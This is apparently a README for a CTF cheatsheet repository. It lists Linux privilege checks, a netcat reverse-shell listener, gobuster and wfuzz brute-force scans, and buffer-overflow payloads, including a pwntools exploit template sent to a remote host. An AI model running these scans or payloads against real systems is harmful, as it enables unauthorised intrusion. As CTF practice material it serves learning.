# ctf-cheatsheet
This repo comprises useful code bytes for solving common ctf tasks.

## linux privileges
##### get current user
```bash
whoami
```
##### check, what can be executed with root
```bash
sudo -l
```
## linux network
##### change hosts file
```bash
sudo nano /etc/hosts
```
##### listen for reverse shell exploits
```bash
nc -lvp 1234
```
##### scan for folders
###### gobuster
```bash
gobuster dir -u domain.com -w /home/dir/wordlist.txt
```
##### scan for subdomains
1) add main domain to hosts
2) run wfuzz (here: hide results with code 301)
```bash
wfuzz -c -w /home/path/subdomains.txt -u "http://domain.com" -H "Host: FUZZ.domain.com" -t 50 --hc 301
```
## buffer overflow
##### execute locally, string as text input
###### bash
```bash
run <<< $(python -c 'print(188*"\x41" + "\xe2\x91\x04\x08" + "\x43" * 4 + "\xef\xbe\xad\xde"+ "\x0d\xd0\xde\xc0" )')
```
##### execute remotely, string as text input
###### bash
```bash
echo $(python -c 'print(188*"\x41" + "\xe2\x91\x04\x08")') | nc 123.123.123.123 32123
```
###### pwntools
```bash
from socket import socket
from pwn import *
ip = "sub.domain.com"
port = 1234
ret = 0x080491e2
no = 0x32432342
para_1 = 0xdedebebe
para_2 = 0xc0c00d0d
payload_len = 200 + 20
payload = "A" * payload_len
payload += p32(ret)
payload += p32(no)
payload += p32(para_1)
payload += p32(para_2)
r = remote(ip, port)
r.recvline()
r.sendline(payload)
r.interactive()
```

## python packages
##### build python package
```bash
python3 setup.py sdist bdist_wheel
```

##### upload with twine
```bash
python3 -m twine upload --repository-url http://pypi.domain.com:8080 /home/path/dist/* --verbose
```
-> enter username and password
